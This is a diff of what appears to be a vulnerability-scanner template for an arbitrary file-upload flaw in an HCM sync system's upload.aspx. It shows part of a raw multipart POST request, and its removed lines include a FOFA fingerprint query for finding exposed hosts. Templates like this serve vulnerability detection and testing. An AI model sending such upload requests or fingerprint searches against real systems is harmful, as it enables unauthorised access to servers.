@@ -3,12 +3,8 @@ info:
   name: HCM信息同步管理系统upload.aspx存在任意文件上传漏洞
   author: hacktwo
   severity: high
-  description: '来源: 语雀漏洞知识库 https://www.yuque.com/hacktwo/dtdx2v/gywvx2loryw9ls0s'
+  description: ''
   tags: file-upload,2026
-  metadata:
-    source: yuque-hacktwo-dtdx2v
-    doc-slug: gywvx2loryw9ls0s
-    fofa: body="icon pwd"&&web.body="\"login-logo\">LOGO"
 http:
 - raw:
   - 'POST /upload.aspx HTTP/1.1
@@ -39,9 +35,7 @@ http:
 
     12345
 
-    ------WebKitFormBoundaryFfJZ4PlAZBixjELj--
-
-    ![](https://cdn.nlark.com/yuque/0/2026/png/43110909/1785162455678-9d2d0fbb-4070-4b16-a126-3143fe957187.png)'
+    ------WebKitFormBoundaryFfJZ4PlAZBixjELj--'
   redirects: false
   matchers:
   - status:
